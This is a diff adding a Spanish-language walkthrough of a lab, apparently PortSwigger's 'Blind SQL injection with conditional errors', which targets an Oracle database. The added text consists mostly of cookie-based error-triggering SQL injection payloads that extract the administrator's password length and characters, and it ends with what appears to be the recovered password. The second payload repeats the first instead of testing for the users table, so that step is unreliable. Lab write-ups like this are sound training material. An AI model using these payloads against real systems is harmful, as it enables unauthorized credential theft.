@@ -271,3 +271,33 @@ echo "finish"
 ```
 
 Despues de ejecutarlo solo nos quedaría logearnos para resolver el laboratorio.
+
+### Lab 12: Blind SQL injection with conditional errors
+
+Utiliza una base de datos de oracle
+
+Comprobamos que nos bote error colocando la cookie de la siguiente manera
+
+```sql
+42bE1LpD9wjQKpT9' and (SELECT case when (1=0) then to_char(1/0) else 'a' end from dual where rownum = 1)='a
+```
+
+Ahora probamos si tiene la tabla users como nos pide el ejercicio
+
+```sql
+42bE1LpD9wjQKpT9' and (SELECT case when (1=0) then to_char(1/0) else 'a' end from dual where rownum = 1)='a
+```
+
+Luego verificamos la longitud de la contraseña del administrador
+
+```sql
+42bE1LpD9wjQKpT9' and (SELECT case when (length(password)=20) then to_char(1/0) else 'a' end from users where username='administrator')='a
+```
+
+lo demás será iterar hasta encontrar el resultado correcto en cada letra de `password`
+
+```sql
+42bE1LpD9wjQKpT9' and (SELECT case when (substr(password,1,1)='e') then to_char(1/0) else 'a' end from users where username='administrator')='a
+```
+
+l3w4nombeg0v2nrs90mv
